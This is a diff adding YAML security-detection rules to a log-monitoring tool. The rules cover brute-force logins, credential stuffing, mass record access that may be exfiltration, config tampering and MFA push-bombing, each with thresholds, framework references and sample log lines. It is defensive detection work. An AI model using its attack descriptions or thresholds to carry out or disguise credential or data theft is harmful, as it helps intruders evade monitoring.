+    description: "Detects a high rate of login attempts from any source within a short time window."
+    detection_logic: "Counts all login attempts; fires when the total rate exceeds the threshold (default 20 within 10s)."
+    recommended_action: "Rate-limit the login endpoint and add CAPTCHA; block the offending source range."
+    framework_refs: "MITRE T1110.004 · OWASP A07:2021 · NIST AC-7 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 14:37:00 CRITICAL 250 login attempts from 198.51.100.7 in 10 seconds"
+    is_static: false
+    default_threshold: 20
+    time_window_seconds: 10
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Multiple User Failures"
+    rule_type: "behavioral"
+    condition: "multi_user_failures"
+    severity: "HIGH"
+    description: "Detects failed logins for multiple different usernames from the same IP (credential stuffing)."
+    detection_logic: "Counts distinct usernames failed per source IP; fires when one IP targets >= threshold users (default 5)."
+    recommended_action: "Block the source IP and force resets on targeted accounts; enforce MFA platform-wide."
+    framework_refs: "MITRE T1110.004 · OWASP A07:2021 · NIST AC-7 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 14:38:00 CRITICAL 45 different usernames failed login from 198.51.100.7 in 300 seconds"
+    is_static: false
+    default_threshold: 5
+    time_window_seconds: 300
+    group_by: "source_ip"
+    is_enabled: true
+
+  - rule_name: "Repeated Access Denials"
+    rule_type: "behavioral"
+    condition: "repeated_access_denials"
+    severity: "HIGH"
+    description: "Detects repeated access denied events from the same source IP exceeding the threshold."
+    detection_logic: "Counts 401/403/access-denied events per source IP; fires when one source meets the threshold (default 10)."
+    recommended_action: "Block the probing IP and audit the targeted resources' access controls for gaps."
+    framework_refs: "MITRE T1190 · OWASP A01:2021 · NIST AC-3 · ISO 27001 A.8.3 · CERT-In"
+    example_log: "2024-01-15 14:39:00 MEDIUM 30 HTTP 403 responses to 192.168.1.99 in 300 seconds"
+    is_static: false
+    default_threshold: 10
+    time_window_seconds: 300
+    group_by: "source_ip"
+    is_enabled: true
+
+  - rule_name: "Error Rate Spike"
+    rule_type: "behavioral"
+    condition: "error_rate_spike"
+    severity: "MEDIUM"
+    description: "Detects a sudden spike in error-level log entries within a time window."
+    detection_logic: "Counts error/critical/exception lines; fires when the total exceeds the threshold (default 50 within 5 min)."
+    recommended_action: "Investigate root cause (bug, fuzzing, attack); disable verbose errors in production."
+    framework_refs: "MITRE T1499 · NIST SI-4 · ISO 27001 A.8.16 · CERT-In"
+    example_log: "2024-01-15 14:40:00 HIGH 512 application errors in 300 seconds (baseline: 8/min)"
+    is_static: false
+    default_threshold: 50
+    time_window_seconds: 300
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Service Crash Loop"
+    rule_type: "behavioral"
+    condition: "service_crash_loop"
+    severity: "HIGH"
+    description: "Detects a service that is repeatedly crashing and restarting within a short period."
+    detection_logic: "Counts crash/restart/segfault events; fires when the total meets the threshold (default 3 within 2 min)."
+    recommended_action: "Inspect crash dumps for exploitation; patch the service and isolate it while investigating."
+    framework_refs: "MITRE T1499 · NIST SI-4 · ISO 27001 A.8.16 · CERT-In"
+    example_log: "2024-01-15 14:41:00 HIGH Service 'nginx' crashed and restarted 6 times in 120 seconds"
+    is_static: false
+    default_threshold: 3
+    time_window_seconds: 120
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Rapid Sequential Actions"
+    rule_type: "behavioral"
+    condition: "rapid_sequential_actions"
+    severity: "MEDIUM"
+    description: "Detects a single user performing an unusually high number of actions in a short period (possible bot)."
+    detection_logic: "Counts total actions in the dataset; fires when volume exceeds the threshold (default 50 within 60s)."
+    recommended_action: "Apply per-account rate limiting and review the activity; require re-authentication if anomalous."
+    framework_refs: "MITRE T1499 · NIST SI-4 · ISO 27001 A.8.16 · CERT-In"
+    example_log: "2024-01-15 14:42:00 MEDIUM User 'etl_svc' performed 850 API calls in 60 seconds"
+    is_static: false
+    default_threshold: 50
+    time_window_seconds: 60
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Mass Data Access"
+    rule_type: "behavioral"
+    condition: "mass_data_access"
+    severity: "MEDIUM"
+    description: "Detects a user accessing an unusually large number of records or resources (possible data exfiltration)."
+    detection_logic: "Counts records/resources accessed; fires when volume exceeds the threshold (default 1000 within 1 hour)."
+    recommended_action: "Suspend the account and assess exposure; apply DLP and per-query result limits."
+    framework_refs: "MITRE T1530 / T1213 · NIST AC-6 · ISO 27001 A.8.12 · CERT-In"
+    example_log: "2024-01-15 14:43:00 CRITICAL User 'reports' accessed 12,000 customer records in 120 seconds"
+    is_static: false
+    default_threshold: 1000
+    time_window_seconds: 3600
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Resource Exhaustion"
+    rule_type: "behavioral"
+    condition: "resource_exhaustion"
+    severity: "HIGH"
+    description: "Detects resource exhaustion events such as out-of-memory, disk full, or too many connections."
+    detection_logic: "Fires on resource-exhaustion events (OOM, disk full, too many connections, CPU saturation)."
+    recommended_action: "Identify and stop the offending process; add resource quotas and 80% utilisation alerts."
+    framework_refs: "MITRE T1499.001 · NIST SC-5 · ISO 27001 A.8.6 · CERT-In"
+    example_log: "2024-01-15 14:44:00 HIGH OOM kill: process 'mysqld' used 98% RAM — system critical"
+    is_static: false
+    default_threshold: 1
+    time_window_seconds: 0
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Unexpected Shutdown"
+    rule_type: "behavioral"
+    condition: "unexpected_shutdown"
+    severity: "HIGH"
+    description: "Detects unexpected system or service shutdowns, kills, or terminations without a planned event."
+    detection_logic: "Fires on unplanned shutdown/termination signals (SIGKILL/SIGTERM, abnormal exit, crash detect)."
+    recommended_action: "Determine the cause and preserve a forensic image; verify system integrity before restart."
+    framework_refs: "MITRE T1529 · NIST IR-4 · ISO 27001 A.5.29 · CERT-In"
+    example_log: "2024-01-15 14:45:00 HIGH System shutdown signal received (source: unknown) — 3 events in 300s"
+    is_static: false
+    default_threshold: 1
+    time_window_seconds: 0
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Configuration Change"
+    rule_type: "behavioral"
+    condition: "configuration_change"
+    severity: "MEDIUM"
+    description: "Detects any configuration, setting, or parameter modification events in the system."
+    detection_logic: "Fires when a configuration/setting/policy modification event is logged."
+    recommended_action: "Verify the change was authorised and roll back if not; enable config-drift detection."
+    framework_refs: "MITRE T1562 · NIST CM-3 · ISO 27001 A.8.9 · CERT-In"
+    example_log: "2024-01-15 14:46:00 MEDIUM sshd_config modified by 'deploy' — PermitRootLogin changed to yes"
+    is_static: false
+    default_threshold: 1
+    time_window_seconds: 0
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Database Error Spike"
+    rule_type: "behavioral"
+    condition: "database_error_spike"
+    severity: "MEDIUM"
+    description: "Detects a spike in database connection or query errors suggesting DB instability or attack."
+    detection_logic: "Counts database/SQL error events; fires when the total exceeds the threshold (default 20 within 5 min)."
+    recommended_action: "Check DB health and look for concurrent SQL injection; tune the connection pool."
+    framework_refs: "MITRE T1190 · OWASP A03:2021 · NIST SI-4 · ISO 27001 A.8.16 · CERT-In"
+    example_log: "2024-01-15 14:47:00 MEDIUM 200 database errors in 300 seconds — possible injection attack"
+    is_static: false
+    default_threshold: 20
+    time_window_seconds: 300
+    group_by: "global"
+    is_enabled: true
+
+# ── Custom no-code rules (generic engine: pattern + threshold + group-by) ──────
+# These demonstrate the admin no-code engine: a regex/keyword pattern is counted and
+# grouped by source_ip / username / global, firing when the count meets the threshold.
+custom_rules:
+
+  - rule_name: "MFA Fatigue / Push Bombing"
+    rule_type: "custom"
+    condition: "(?i)(?:mfa|2fa|otp|push|verification)[^\\n]{0,30}(?:prompt|request|sent|challenge|denied|rejected|push notification)"
+    severity: "HIGH"
+    description: "Detects MFA fatigue / push-bombing: many MFA prompts to one user in a short period."
+    detection_logic: "Counts MFA/OTP prompt events per username; fires when one user receives >= threshold prompts (default 5)."
+    recommended_action: "Confirm the prompts with the user and reset credentials; enable number-matching MFA."
+    framework_refs: "MITRE T1621 · NIST IA-2 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 15:01:00 WARN MFA push notification sent to user 'jdoe' (attempt 11 in 2 minutes)"
+    is_static: false
+    default_threshold: 5
+    time_window_seconds: 300
+    group_by: "username"
+    is_enabled: true
